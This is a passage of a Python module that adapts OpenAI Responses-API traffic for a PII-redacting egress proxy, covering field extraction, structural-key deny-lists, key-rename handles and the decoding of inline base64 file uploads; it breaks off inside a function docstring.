#!/usr/bin/env python3
"""OpenAI Responses-API adapter for the OSSRedact egress proxy.

Same privacy contract as /v1/messages and /v1/chat/completions: redact PII + secrets in the OUTBOUND request's
free-text fields to stable placeholders, and rehydrate the placeholders back to real values on the response --
so a Responses-API client (Codex CLI, which speaks /v1/responses ONLY) sees real data while the upstream model
only ever reasons over placeholders.

The detection/redaction itself is SHARED: the /v1/responses route in egress_proxy.py calls the same
redact_body() it uses for Anthropic, passing extract_text_fields_responses as the field extractor. This module
adds only the Responses <-> placeholder schema translation (request fields, response, and SSE stream).

Schema (verified against the OpenAI Responses API reference, June 2026):
  REQUEST  -- `input` is EITHER a plain string OR an array of input items. Each item has a `role` and a
              `content` which is EITHER a string OR an array of typed parts ({type:'input_text'|'text', text}
              plus input_image/input_file parts). A top-level `instructions` string also carries user-supplied
              text. body['tools'] carries tool/function/MCP definitions (descriptions + JSON-Schema). The client
              is Codex CLI -- an AGENTIC coding tool -- so the input array also carries agentic item types
              (shell_call, apply_patch_call, code_interpreter_call, mcp_call, custom_tool_call, file_search_call,
              web_search_call, computer_call, reasoning) whose free-text payloads carry real codebase/file PII.
              EVERY model-visible text location is redacted -- missing any is a PII LEAK.
  RESPONSE -- `output` is an array of items. A `message` item carries content parts ({type:'output_text'|'text',
              text}); a `function_call` item carries an `arguments` JSON string. A convenience top-level
              `output_text` mirrors the assistant text. All assistant text + echoed input is rehydrated.
  STREAM   -- typed SSE events, each a `data: {json}` line whose JSON has its own `type`. Text streams as
              `response.output_text.delta` (carries `delta`, `item_id`, `output_index`, `content_index`);
              tool args stream as `response.function_call_arguments.delta` / `.done`. We reassemble + rehydrate.

EXTRACTION STRATEGY (convergent, not whack-a-mole): a NARROW allow-list of item types is a SILENT LEAK for
every type it does not enumerate. So extraction is a DEFENSIVE RECURSIVE FREE-TEXT SWEEP gated by a STRUCTURAL-
KEY DENY-LIST: the well-known chat shapes keep their EXPLICIT 'kind' mapping (system/tool_result/message --
redact_body uses kind for its prose heuristic + session derivation), and EVERY other reachable string whose KEY
is not structural (type/role/id/*_id/model/name/url/pattern/JSON-Schema structural keys/...) is surfaced as a
redactable Field with kind 'tool_result' (enum items + const literals ARE surfaced: they are model-picked VALUES).
This auto-covers all current AND future agentic item types. Redaction is SPAN-BASED
(only DETECTED PII substrings change), so surfacing a structural-but-non-deny string is low-risk and over-
redaction is the safe error; the deny-list still protects identifiers/enums that could resemble a PII pattern.

FILE INPUTS (input_file.file_data, input_image): a TEXT file uploaded inline as base64 file_data is NOT a silent
bypass. A file is treated as text in THREE tiers (file_data itself is deny-listed, so the recursive sweep cannot
reach it -- this dedicated path is the only thing that scans inline uploads):
  1. an explicit text mime_type (text/*, application/json, ...) OR a recognized text extension (.md, .py, ...);
  2. a recognized EXTENSIONLESS text basename (Dockerfile, Makefile, LICENSE, .gitignore, ...) -- the round-3 HIGH
     gap where the dot-suffix allow-list missed extensionless build/config/license uploads;
  3. NO mime AND no known-binary extension AND (extensionless OR unknown extension) -> ATTEMPT a strict UTF-8
     decode; if it round-trips as valid UTF-8 text, redact it as text. A present non-text mime or a known binary
     extension short-circuits this so a binary blob is never UTF-8-misread.
For any tier we base64-decode -> redact as text -> re-encode back into file_data (and rehydrate the same way).
For binary/undetermined types the bytes pass through UNCHANGED but EXPLICITLY: the extractor records a structured
note (pop_file_passthrough_notes) so the egress can log "file bytes not scanned: <mime>" -- a documented+logged
limitation, never a silent pass. The note's filename is SANITIZED to an extension descriptor only (e.g. '*.bin')
because a filename can itself carry PII ('patient-john-doe.bin'); the raw name never reaches the gateway log.
Image bytes (input_image.image_url data: URIs, file_data on image parts) are likewise binary passthrough (not
scanned).

FILE_DATA SCOPE DECISION: text-mime AND extensionless-text AND valid-UTF-8 inline uploads ARE decoded + redacted +
re-encoded. Genuine binary (image/archive/office/etc.) is a DOCUMENTED+LOGGED passthrough, never silent -- the
minimum bar is met and exceeded.

Self-contained ON PURPOSE: the small pure helpers below (rehydrate_text / _rehydrate_json /
rehydrate_json_string / split_safe / Field) MIRROR the identical ones in egress_proxy.py and openai_adapter.py.
Duplicated so this module imports nothing heavy (no fastapi/httpx/the NPU stack) and stays unit-testable in
isolation. If you change the placeholder grammar or the JSON-safe rehydration there, mirror it here.
"""
import base64, binascii, json, re
import tool_arg_policy   # B5: withhold FLOOR/secret-class placeholders from EXECUTED tool-call arguments

# matches the tail of a partial placeholder still being streamed (e.g. "<EMAIL_00" before its ">" arrives).
# A label may carry INTERNAL underscores (gate-form labels such as PHONE_NUMBER / SENSITIVE_ACCOUNT_ID ->
# <PHONE_NUMBER_001> / <SENSITIVE_ACCOUNT_ID_001>), so a partial split like "<PHONE_NUM" must still be held back
# (FIX-ROUND-2 MEDIUM: the old [A-Z0-9]*_?\d* allowed at most ONE underscore and dropped multi-underscore
# partials, emitting broken placeholder fragments). The matcher is a run of label chars [A-Z0-9_] -- any prefix of
# a valid <[A-Z0-9_]+_\d{3,}> token. Over-holding a stray uppercase '<TOKEN' briefly is harmless (it flushes once
# more text or '>' arrives); a non-label tail like '< b' still fails the fullmatch and is not held.
_PH_PREFIX_RE = re.compile(r'[A-Z0-9_]*')

# A COMPLETE placeholder token <LABEL_NNN> (mirrors egress_proxy._PH_TOKEN_RE). Used to recognize a string that is
# ALREADY a placeholder so we never re-surface it as a redactable object KEY (a placeholder key carries no PII to
# detect, and re-handling it on a re-entrant pass is pointless). The placeholder grammar is UNCHANGED.
_PH_FULL_RE = re.compile(r'<[A-Z0-9_]+_\d{3,}>')


class Field:
    """A (container, key) handle onto one redactable string so substitution writes back IN PLACE. `container`
    may be a dict (key is a str) OR a list (key is an int index): list[idx] = value writes back in place exactly
    like dict[key] = value, so shell_call.action.commands (a list of command strings) is handled element-wise."""
    __slots__ = ('container', 'key', 'kind')

    def __init__(self, container, key, kind):
        self.container = container
        self.key = key
        self.kind = kind

    @property
    def text(self):
        value = self.container[self.key]
        return str(value) if _is_scan_number(value) else value

    def write(self, value):
        self.container[self.key] = value


def _is_scan_number(value):
    """True for native JSON numeric leaves that should be scanned as text.

    bool is a subclass of int in Python, but JSON booleans are control values here,
    not redactable text.
    """
    return isinstance(value, (int, float)) and not isinstance(value, bool)


def _disambiguate_key(new_key, node, old_key):
    """COLLISION-SAFE key rename target (FIX-ROUND-4-R3 FIX C). When a redacted-key placeholder `new_key` would
    collide with a DIFFERENT existing sibling in `node`, the prior code no-opped and KEPT THE RAW PII KEY (a leak).
    Instead, return a UNIQUE variant of `new_key` that is NOT already present (and not the original key), so BOTH
    requirements hold: (a) the raw PII key NEVER survives on the wire, AND (b) no sibling entry is dropped. We append
    a '.dupN' counter to the placeholder (a degenerate case only: distinct PII values mint distinct placeholders, so
    a clash arises only if the user data ALREADY literally contains a <LABEL_NNN>-shaped sibling key). The placeholder
    GRAMMAR is unchanged for genuine placeholders; the disambiguation suffix is appended OUTSIDE the token so it never
    masquerades as a different real placeholder. If `new_key` does not collide it is returned unchanged."""
    if new_key not in node or new_key == old_key:
        return new_key
    n = 1
    candidate = '{}.dup{}'.format(new_key, n)
    while candidate in node and candidate != old_key:
        n += 1
        candidate = '{}.dup{}'.format(new_key, n)
    return candidate


class _JsonArgsContainer:
    """Backing container for the string VALUES inside a parsed tool-argument JSON object (function_call.arguments,
    mcp_call.arguments, custom_tool_call.input, ...). The gate NER detects a bare name far better than the same
    name embedded in a serialized '{"k":"v"}' blob, so the arguments JSON is PARSED and each leaf string value is
    surfaced as its own clean Field whose `container` is one of these. `__getitem__`/`__setitem__` proxy onto the
    parsed object (a dict keyed by str, or a list keyed by int) exactly like a real dict/list, but every write
    RE-SERIALIZES the whole parsed object back into the originating `slot` (a (container,key) handle onto the
    arguments string) with json.dumps(..., ensure_ascii=False) -- so the redacted value lands inside the JSON and
    the arguments string stays valid JSON. A real value with quotes/backslashes can't break the JSON because
    json.dumps re-escapes it (the response-side rehydrate_json_string is the symmetric value-level handler)."""
    __slots__ = ('_node', '_root', '_slot_container', '_slot_key')

    def __init__(self, node, root, slot_container, slot_key):
        self._node = node                  # the dict/list this Field's key indexes into
        self._root = root                  # the top-level parsed arguments object (re-dumped on every write)
        self._slot_container = slot_container   # container holding the arguments STRING (a dict or list)
        self._slot_key = slot_key               # key/index of the arguments string in slot_container

    def __getitem__(self, key):
        return self._node[key]

    def __setitem__(self, key, value):
        self._node[key] = value
        self._slot_container[self._slot_key] = json.dumps(self._root, ensure_ascii=False)


class _JsonArgsEntry:
    """One (key, value) entry of a parsed tool-argument JSON OBJECT, surfaced so BOTH the object KEY and its string
    value are redactable (FIX-ROUND-4-R2 LEAK 2: PII encoded AS a JSON object key -- e.g. an email used as the key --
    was forwarded raw because the value collector only walked VALUES). The key-handle and the value-handle SHARE one
    mutable current-key cell so they can never desync: when the key is redacted to a placeholder the dict key is
    renamed in place AND the cell updates, so the value-handle (which always indexes via the cell) follows the new
    key instead of KeyError-ing on the stale one. Every write re-serializes the whole parsed root back into the
    arguments-string slot with json.dumps(ensure_ascii=False), so the arguments string stays valid JSON and a
    redacted key/value with quotes or backslashes is re-escaped safely."""
    __slots__ = ('_node', '_root', '_slot_container', '_slot_key', '_cell')

    def __init__(self, node, root, slot_container, slot_key, orig_key):
        self._node = node                       # the parsed dict this entry lives in
        self._root = root                       # top-level parsed arguments object (re-dumped on every write)
        self._slot_container = slot_container    # container holding the arguments STRING
        self._slot_key = slot_key                # key/index of the arguments string in slot_container
        self._cell = [orig_key]                  # CURRENT key, shared by the key-handle and the value-handle

    def _reserialize(self):
        self._slot_container[self._slot_key] = json.dumps(self._root, ensure_ascii=False)

    # --- KEY handle: Field(container=self.key_handle, key='__key__'). text=current key; write=rename the dict key.
    @property
    def key_handle(self):
        return _JsonArgsKeyHandle(self)

    def _rename_key(self, new_key):
        old = self._cell[0]
        if new_key == old:
            return
        # COLLISION-SAFE rename (FIX-ROUND-4-R3 FIX C, was the leaky no-op of FIX-ROUND-4-R2 MEDIUM :153). If
        # `new_key` already names a DIFFERENT entry in this object, a naive rebuild ({new_key if k==old else k: v})
        # would map two keys to one slot and SILENTLY DROP an entry; the PRIOR fix avoided the drop by no-opping the
        # rename, but that KEPT THE RAW PII KEY on the wire (counting it redacted) -- a leak. _disambiguate_key gives
        # a unique non-colliding target so BOTH guarantees hold: the raw PII key never survives AND no sibling entry
        # is dropped. (Genuinely pathological: distinct values mint distinct placeholders, so a clash arises only if
        # the user data already literally contains a <LABEL_NNN>-shaped sibling key.)
        target = _disambiguate_key(new_key, self._node, old)
        # rebuild the dict preserving INSERTION ORDER, swapping only this one key -> a clean re-serialization.
        rebuilt = {}
        for k, v in self._node.items():
            rebuilt[target if k == old else k] = v
        self._node.clear()
        self._node.update(rebuilt)
        self._cell[0] = target
        self._reserialize()

    # --- VALUE handle: Field(container=self.value_handle, key='__val__'). text/write index via the shared cell.
    @property
    def value_handle(self):
        return _JsonArgsValueHandle(self)


class _JsonArgsKeyHandle:
    """A (container, key) proxy onto the OBJECT KEY of one _JsonArgsEntry. `container['__key__']` returns the current
    key string; `container['__key__'] = new` renames the dict key (and re-serializes). Used so a PII object key is
    surfaced + redacted + round-tripped exactly like any other Field."""
    __slots__ = ('_entry',)

    def __init__(self, entry):
        self._entry = entry

    def __getitem__(self, key):
        return self._entry._cell[0]

    def __setitem__(self, key, value):
        self._entry._rename_key(value)


class _JsonArgsValueHandle:
    """A (container, key) proxy onto the VALUE of one _JsonArgsEntry, indexed via the entry's shared current-key cell
    so it survives a sibling KEY rename. `container['__val__']` reads node[current_key]; assignment writes it back
    and re-serializes."""
    __slots__ = ('_entry',)

    def __init__(self, entry):
        self._entry = entry

    def __getitem__(self, key):
        return self._entry._node[self._entry._cell[0]]

    def __setitem__(self, key, value):
        self._entry._node[self._entry._cell[0]] = value
        self._entry._reserialize()


class _DictEntry:
    """One (key, value) entry of a LIVE request dict in USER-DATA scope, surfaced so the OBJECT KEY itself is
    redactable (FIX-ROUND-4-R2 LEAK 1 round-2 :515: PII encoded AS a dict key -- e.g. an email used as the key of a
    metadata / prompt.variables / function_call_output.output map -- was never surfaced because the recursive walk
    iterated keys only as traversal metadata). Unlike _JsonArgsEntry this mutates the ACTUAL request dict in place (no
    JSON re-serialization: the dict IS the wire structure). The key-handle and value-handle SHARE a mutable current-key
    cell so a key rename never desyncs the value-handle: when the key is redacted to a placeholder the live dict key is
    renamed AND the cell updates, so the value-handle (indexing via the cell) follows the new key."""
    __slots__ = ('_node', '_cell')

    def __init__(self, node, orig_key):
        self._node = node              # the LIVE dict this entry lives in
        self._cell = [orig_key]        # CURRENT key, shared by the key-handle and the value-handle

    def _rename_key(self, new_key):
        old = self._cell[0]
        if new_key == old:
            return
        # COLLISION-SAFE rename (FIX-ROUND-4-R3 FIX C, same rationale as _JsonArgsEntry._rename_key): the prior guard
        # no-opped on a collision, which KEPT THE RAW PII KEY in the live dict -- a leak. _disambiguate_key picks a
        # unique non-colliding target so the raw PII key never survives AND the colliding sibling entry is not dropped.
        target = _disambiguate_key(new_key, self._node, old)
        rebuilt = {}
        for k, v in self._node.items():
            rebuilt[target if k == old else k] = v
        self._node.clear()
        self._node.update(rebuilt)
        self._cell[0] = target

    @property
    def key_handle(self):
        return _DictKeyHandle(self)

    @property
    def value_handle(self):
        return _DictValueHandle(self)


class _DictKeyHandle:
    """A (container, key) proxy onto the OBJECT KEY of one _DictEntry. `container['__key__']` returns the current key;
    assignment renames the live dict key in place (collision-safe)."""
    __slots__ = ('_entry',)

    def __init__(self, entry):
        self._entry = entry

    def __getitem__(self, key):
        return self._entry._cell[0]

    def __setitem__(self, key, value):
        self._entry._rename_key(value)


class _DictValueHandle:
    """A (container, key) proxy onto the VALUE of one _DictEntry, indexed via the entry's shared current-key cell so it
    survives a sibling KEY rename. `container['__val__']` reads node[current_key]; assignment writes it back."""
    __slots__ = ('_entry',)

    def __init__(self, entry):
        self._entry = entry

    def __getitem__(self, key):
        return self._entry._node[self._entry._cell[0]]

    def __setitem__(self, key, value):
        self._entry._node[self._entry._cell[0]] = value


class FileDataField:
    """A redactable handle onto the DECODED text of an input_file.file_data base64 payload. `.text` returns the
    decoded text; `.write` re-encodes back into the part's file_data so substitution writes back IN PLACE while
    the wire stays valid base64. Used only for text-like file uploads (binary is documented passthrough)."""
    __slots__ = ('part', 'key', 'kind', '_prefix', '_text')

    def __init__(self, part, key, kind, prefix, decoded_text):
        self.part = part
        self.key = key          # the dict key holding the base64 string (usually 'file_data')
        self.kind = kind
        self._prefix = prefix   # a 'data:<mime>;base64,' prefix to preserve, or '' for a bare base64 payload
        self._text = decoded_text

    @property
    def text(self):
        return self._text

    def write(self, value):
        self._text = value
        b64 = base64.b64encode(value.encode('utf-8')).decode('ascii')
        self.part[self.key] = self._prefix + b64


# ---------------------------------------------------------------------------
# Request field extraction (OpenAI Responses /v1/responses).
# ---------------------------------------------------------------------------
# STRUCTURAL-KEY DENY-LIST: a string value held under one of these keys is NEVER surfaced for redaction, because
# redacting it would break the request (identifiers, enums, routing fields) or a JSON-Schema structural token. A
# list element inherits its parent key's deny status. This is the ONLY thing that keeps the recursive backstop
# from corrupting structure; everything not in here is fair game for span-based redaction (over-redaction safe).
_DENY_KEYS = frozenset({
    # identity / routing / control
    # NOTE (FIX-ROUND-3 HIGH): the BARE key 'url' is NO LONGER deny-listed. A bare `url` appears on
    # citation/annotation items ({type:'url_citation', url:'https://host/path?email=...', title:...}) where it is
    # MODEL-VISIBLE free text that can carry PII in its path/query -- deny-listing it skipped it entirely and the
    # value bypassed the neural gate. It is now SURFACED for span-based redaction (only a detected PII substring is
    # masked; an ordinary 'https://example.test/x.png' has no PII span and passes through unchanged). The ROUTING
    # url keys stay protected: 'image_url'/'file_url'/'server_url' are listed explicitly here (and in
    # _ROUTING_URL_KEYS), so redacting one can never corrupt a request that selects a server/image/file. Other *_url
    # keys (a citation source_url, an echoed profile_url) are NOT routing and ARE surfaced -- see _is_denied_key
    # (FIX-ROUND-5-R6 removed the blanket '*_url' deny that was leaking non-routing url content).
    'type', 'role', 'id', 'object', 'status', 'model', 'name', 'image_url', 'file_url', 'mime_type',
    'mimetype', 'encoding', 'format', 'detail', 'tool_choice', 'service_tier', 'output_index', 'content_index',
    'index', 'file_data', 'version',
    # MCP / file-search / hosted-tool ROUTING keys: these select WHICH server/store/tool to call, not free text.
    # Redacting them (a label that happens to match a PII pattern) would corrupt the tool config -> never surface.
    'server_label', 'server_url', 'vector_store_ids', 'allowed_tools', 'connector_id', 'authorization',
    'container', 'container_id', 'partial_images', 'background', 'verbosity',
    # JSON-Schema structural keys inside tool parameter schemas. `enum` items and `const` literals are VALUES the
    # model picks/echoes -- a PII literal that appears ONLY as an enum item or a const (e.g.
    # const:'ops@acme-loans.example', enum:['ops@acme-loans.example']) would otherwise be forwarded RAW upstream.
    # They are SURFACED for redaction: span-based redaction only masks real PII (an ordinary enum like 'celsius'
    # never matches), the request goes upstream with the placeholder, and RESPONSE rehydration maps it back, so a
    # const:'<EMAIL_001>' / enum:['<EMAIL_001>'] round-trips correctly. `pattern` is the ONE deliberate structural
    # exception kept on the deny-list: a `pattern` value is a REGEX, and rewriting a substring of a regex can change
    # its meaning (a placeholder is not the same matcher), so we never surface it.
    'properties', 'required', 'pattern', 'additionalProperties', '$ref', '$defs', 'parameters',
    'strict',
    # Custom-tool GRAMMAR fields (Responses `tools[].format = {type:'grammar', syntax:'lark'|'regex',
    # definition:'<grammar>'}`). Same class as `pattern`: structural, request-breaking if rewritten. `syntax`
    # is a strict enum the backend validates ('lark'/'regex') -- the NER tagged a literal 'lark' as an
    # ORGANIZATION and masked it to <ORGANIZATION_001>, which the ChatGPT/Codex backend rejected with a 400.
    # `definition` is the grammar source (not user PII); masking a token inside it would change the grammar.
    'syntax', 'definition',
})


# CRYPTOGRAPHICALLY-OPAQUE reasoning material. An OpenAI Responses `reasoning` item carries `encrypted_content`, a
# ciphertext blob the model decrypts on the NEXT turn to recover its own private chain-of-thought (Codex CLI runs
# stateless -- store:false, include:["reasoning.encrypted_content"] -- and re-sends these items every turn). It MUST
# round-trip to the upstream BYTE-FOR-BYTE: any mutation (the known-value sweep hitting a coincidental substring of
# the base64, or the NER false-positive-tagging a span inside the gibberish) makes it undecryptable upstream ->
# `invalid_request_error / invalid_encrypted_content` ("Encrypted content could not be decrypted or parsed"), which
# HARD-BREAKS Codex through the gate. The blob is generated from ALREADY-REDACTED input, so it holds no real PII to
# protect. So it is NEVER surfaced for redaction, in ANY scope (structural or user-data), and never rehydrated on the
# response. The reasoning `summary`/`content` free text is NOT in here on purpose: it is not part of the encrypted
# blob and is not cross-validated against it, so it keeps the normal redact-out / rehydrate-back treatment (no PII
# leaks upstream, and mutating it cannot break decryption).
_OPAQUE_KEYS = frozenset({'encrypted_content'})


def _is_denied_key(k):
    """A key is structural (its string value is never redacted) if it is in the deny-list OR is an identifier
    key matching the *_id family (call_id, item_id, file_id, response_id, previous_response_id, ...) OR one of the
    ENUMERATED genuine routing *_url keys (_ROUTING_URL_KEYS: image_url / file_url / server_url -- these select a
    server/image/file and redacting one corrupts the request).

    FIX-ROUND-5-R6 (residual :370): the BLANKET `k.endswith('_url')` deny was REMOVED. It protected the WHOLE *_url
    family as if every one were routing, but the only genuine REQUEST-routing url keys are the three enumerated above.
    A non-routing *_url on an unenumerated agentic item walked in structural scope (a web_search/citation source_url,
    a profile_url echoed in a tool result) is MODEL-VISIBLE content that can carry PII in its path/query -- denying
    the whole family skipped it entirely and the value bypassed the neural gate. It is now SURFACED for span-based
    redaction, exactly like the bare `url` key (FIX-ROUND-3 HIGH): a clean routing/asset URL has no PII span and
    passes through unchanged, while a PII-bearing url is masked + round-trips. The three genuine routing url keys
    stay protected via _DENY_KEYS / _ROUTING_URL_KEYS membership, so a server/image/file selector is never rewritten."""
    if not isinstance(k, str):
        return False
    return (k in _DENY_KEYS or k in _ROUTING_URL_KEYS
            or k == 'id' or k.endswith('_id'))


# GENUINE ROUTING URL KEYS: image_url on an input_image part, server_url / file_url for mcp/tool routing. These
# select WHICH image/file/server to fetch, so rewriting a substring of one corrupts the request. They are protected
# by STRUCTURAL POSITION (FIX-ROUND-4-R3 FIX B): they live on parts / tool routing reached in STRUCTURAL scope, where
# _is_denied_key (these are in _DENY_KEYS AND match the `*_url` rule) keeps them unsurfaced. They are NO LONGER
# protected by the both-scopes _is_request_breaking_key check -- see FIX B note there for why a *_url INSIDE user data
# must be SCANNED, not protected. (A BARE 'url' is not routing -- it is model-visible citation free text, surfaced.)
_ROUTING_URL_KEYS = frozenset({'image_url', 'file_url', 'server_url'})

# KNOWN OpenAI-protocol ROUTING IDs (FIX-ROUND-4-R2 MEDIUM :488): identifiers that reference a real upstream-side
# resource (an uploaded file, a container, a prior response/item/call, an MCP connector). Span-redacting a substring
# INSIDE one of these corrupts the request -- the upstream can no longer resolve the file/container/call it routes to
# -- so they stay protected EVEN in user-data scope (e.g. a function_call_output.output dict, an `outputs` subtree).
# This is DELIBERATELY NOT the whole `*_id` family: LEAK 1 requires that an APPLICATION/user data id (a bare `id`, a
# `customer_id`, an `order_id`) inside user data IS surfaced as PII, since those carry user records, not routing. Only
# this enumerated set of protocol routing IDs is request-breaking; everything else in the `*_id` family is user data.
_ROUTING_ID_KEYS = frozenset({
    'file_id', 'container_id', 'call_id', 'item_id', 'response_id', 'previous_response_id', 'connector_id',
})


def _is_request_breaking_key(k):
    """Keys protected in BOTH scopes -- redacting them is REQUEST-BREAKING in ANY context, NOT a mere key-name
    collision:
      - known PROTOCOL ROUTING IDs (_ROUTING_ID_KEYS): file_id/container_id/call_id/... reference a real upstream
        resource; a redacted span inside one breaks resolution. (A bare `id`/`customer_id`/`order_id` is NOT here --
        those are user-data PII, LEAK 1.)
    FIX-ROUND-4-R3 FIX B (corrected FIX-ROUND-5-R6): the GENERIC `*_url` family is NOT protected here -- a *_url such
    as metadata.profile_url / function_call_output.output.profile_url is USER CONTENT whose value can carry PII, so it
    MUST be SCANNED (span-based redaction leaves a clean URL unchanged and redacts a PII-bearing one). But the THREE
    ENUMERATED genuine routing url keys (_ROUTING_URL_KEYS: image_url / file_url / server_url) ARE protected in BOTH
    scopes: FIX B assumed they only ever appear in STRUCTURAL scope (where _is_denied_key protects them), but a
    `type:input_image` / `input_file` content PART can be nested INSIDE a user-data container (a prompt.variables value,
    a function_call_output.output content array), and there _is_denied_key is NOT consulted -- so without protecting them
    here, span-redaction would corrupt the routing URL that selects the image/file/server (Codex 2026-06-17 F1/F2).
    FIX-ROUND-4-R3-R2 ITEM 1: `file_data` is NO LONGER protected here either. A GENUINE inline base64 upload lives
    on an input_file / file PART (node.type in input_file/file), reached in STRUCTURAL scope where it is protected
    two ways: it is in _DENY_KEYS (the structural sweep never surfaces the raw base64 blob as "free text"), AND the
    dedicated _file_part_fields path CLAIMS the slot (decoding text-like uploads, recording a passthrough note for
    binary) so the sweep skips the claimed key regardless of scope. But a key literally named `file_data` INSIDE a
    USER-DATA payload (metadata.file_data, function_call_output.output.file_data) is NOT an inline upload part -- it
    is an ordinary user-data string field whose value can carry PII, so it MUST be SCANNED. Protecting it here by
    key-name in BOTH scopes wrongly skipped that user-data field (metadata is explicitly walked as user data)."""
    if not isinstance(k, str):
        return False
    return k in _ROUTING_ID_KEYS or k in _ROUTING_URL_KEYS

# text-like file extensions whose inline base64 file_data we DECODE -> redact -> re-encode.
_TEXT_EXTS = (
    '.txt', '.md', '.markdown', '.csv', '.tsv', '.json', '.jsonl', '.ndjson', '.xml', '.yaml', '.yml', '.toml',
    '.ini', '.cfg', '.conf', '.log', '.html', '.htm', '.css', '.svg', '.rst', '.tex',
    # source-code extensions (Codex is an agentic coding tool: code files carry real codebase/file PII)
    '.py', '.pyi', '.js', '.mjs', '.cjs', '.jsx', '.ts', '.tsx', '.go', '.rs', '.rb', '.php', '.java', '.kt',
    '.kts', '.c', '.h', '.cc', '.cpp', '.hpp', '.cs', '.swift', '.scala', '.sh', '.bash', '.zsh', '.fish',
    '.ps1', '.sql', '.r', '.lua', '.pl', '.dart', '.vue', '.svelte', '.tf', '.dockerfile', '.env', '.gradle',
    '.properties', '.gitignore', '.editorconfig',
)


def _is_text_mime(mime):
    if not isinstance(mime, str):
        return False
    m = mime.split(';', 1)[0].strip().lower()
    if m.startswith('text/'):
        return True
    return m in (
        'application/json', 'application/x-ndjson', 'application/xml', 'application/x-yaml', 'application/yaml',
        'application/toml', 'application/x-sh', 'application/javascript', 'application/x-javascript',
        'application/typescript', 'application/x-python', 'application/x-httpd-php', 'application/sql',
        'application/csv', 'application/x-csv', 'image/svg+xml',
    )


def _is_text_filename(name):
    if not isinstance(name, str):
        return False
    low = name.lower()
    return any(low.endswith(ext) for ext in _TEXT_EXTS)


# Common EXTENSIONLESS text files (build/config/license/doc) carried as inline uploads. Codex is an agentic
# coding tool, so a Dockerfile / Makefile / LICENSE etc. with no MIME type and no dot-suffix would otherwise miss
# the extension allow-list. Matched by basename (case-insensitive), with or without a leading directory path.
_TEXT_BASENAMES = frozenset({
    'dockerfile', 'containerfile', 'makefile', 'gnumakefile', 'cmakelists.txt', 'rakefile', 'gemfile', 'guardfile',
    'procfile', 'vagrantfile', 'brewfile', 'jenkinsfile', 'justfile', 'caddyfile', 'license', 'licence', 'notice',
    'copying', 'authors', 'contributors', 'readme', 'changelog', 'changes', 'history', 'manifest', 'todo',
    'codeowners', '.gitignore', '.gitattributes', '.dockerignore', '.npmignore', '.editorconfig', '.env',
    '.bashrc', '.zshrc', '.profile', '.babelrc', '.eslintrc', '.prettierrc',
})

# Well-known BINARY extensions. When the MIME type is absent we do NOT blindly UTF-8-decode (a stray valid-UTF-8
# run inside a binary blob would falsely look text-like); a recognized binary extension forces the passthrough note.
_BINARY_EXTS = (
    '.png', '.jpg', '.jpeg', '.gif', '.bmp', '.webp', '.tiff', '.tif', '.ico', '.heic', '.heif', '.avif',
    '.pdf', '.zip', '.gz', '.tgz', '.bz2', '.xz', '.7z', '.rar', '.tar', '.jar', '.war', '.class', '.exe',
    '.dll', '.so', '.dylib', '.o', '.a', '.bin', '.dat', '.wasm', '.mp3', '.mp4', '.wav', '.flac', '.ogg',
    '.mov', '.avi', '.mkv', '.webm', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.odt', '.ods',
    '.ttf', '.otf', '.woff', '.woff2', '.eot', '.db', '.sqlite', '.sqlite3', '.pkl', '.pickle', '.npy', '.npz',
)


def _basename(name):
    """Last path segment of a filename (handles / and \\ separators), or '' for a non-string."""
    if not isinstance(name, str):
        return ''
    return re.split(r'[\\/]', name)[-1]


def _is_text_basename(name):
    """A recognized EXTENSIONLESS text file (Dockerfile, Makefile, LICENSE, .gitignore, ...) by basename."""
    return _basename(name).lower() in _TEXT_BASENAMES


def _has_binary_ext(name):
    bn = _basename(name).lower()
    return any(bn.endswith(ext) for ext in _BINARY_EXTS)


def _is_extensionless(name):
    """True if the basename has no dot-suffix extension (a bare 'Dockerfile', not 'notes.md'). A leading-dot
    dotfile like '.env' has no further suffix and counts as extensionless for the decode-attempt heuristic."""
    bn = _basename(name)
    if not bn:
        return False
    core = bn[1:] if bn.startswith('.') else bn
    return '.' not in core


def _sanitize_filename_for_log(name):
    """Reduce a filename to a NON-PII descriptor for the passthrough LOG note. A filename can itself carry PII
    (e.g. 'patient-john-doe-2026.bin'); logging it verbatim leaks to gateway logs even though the forwarded body
    redacts the field. We keep ONLY the lowercase extension (or '<none>' when extensionless) -- enough to explain
    'file bytes not scanned: .bin' without exposing the name."""
    bn = _basename(name)
    if not bn:
        return None
    core = bn[1:] if bn.startswith('.') else bn
    if '.' in core:
        return '*.' + core.rsplit('.', 1)[-1].lower()
    return '<no-ext>'


def _split_data_uri(s):
    """('data:<mediatype>;base64,', <b64-payload>) for a base64 data URI, else ('', <s>) for a bare base64
    string. Returns (None, None) if `s` is not a string. The <mediatype> may carry media-type PARAMETERS
    (e.g. 'data:text/plain;charset=utf-8;base64,...'): the `;base64` token is the LAST token before the comma,
    so we match up to the FINAL ';base64,' rather than the first ';' -- otherwise a parameterized URI falls
    through to an undecodable-text passthrough and its inline payload is left unscanned (HIGH leak)."""
    if not isinstance(s, str):
        return None, None
    # Case-INSENSITIVE on the `;base64,` token: RFC 2397 specifies lowercase, but an adversarial/non-conformant
    # producer can send `;BASE64,` to evade the split -- the whole 'data:...;BASE64,<payload>' would then be treated
    # as a bare (undecodable) base64 string and its inline text payload passed through UNSCANNED (a leak). group(1)
    # preserves the ORIGINAL case, so the prefix re-prepended on write stays byte-identical; only the decoded payload
    # is scanned. Permissive here is the safe direction: we decode + redact MORE, never less.
    m = re.match(r'^(data:[^,]*?;base64,)', s, re.IGNORECASE)
    if m:
        return m.group(1), s[m.end():]
    return '', s


def _decode_b64_text(payload):
    """Decode a base64 payload to UTF-8 text, or None if it isn't valid base64 of valid (strict) UTF-8 text."""
    try:
        raw = base64.b64decode(payload, validate=True)
    except (binascii.Error, ValueError):
        return None
    try:
        return raw.decode('utf-8')
    except UnicodeDecodeError:
        return None


def _claim(claimed, container, key):
    """Register an explicit (container,key) so the recursive backstop won't double-surface it. Returns False if
    already claimed (dedupe by container identity + key)."""
    tag = (id(container), key)
    if tag in claimed:
        return False
    claimed.add(tag)
    return True


def _file_part_fields(part, kind, fields, notes, claimed):
    """Handle an input_file / file part with inline base64 file_data. Text-like -> decode -> surface a
    FileDataField (redact as text, re-encode on write). Binary/undetermined -> pass through UNCHANGED but record a
    structured passthrough note so the egress logs the limitation (never a silent pass).

    "Text-like" is decided in three tiers so an EXTENSIONLESS text upload (Dockerfile, Makefile, LICENSE, ...) is
    not a silent bypass:
      1. An explicit text MIME (text/*, application/json, ...) OR a recognized text extension (.md, .py, ...).
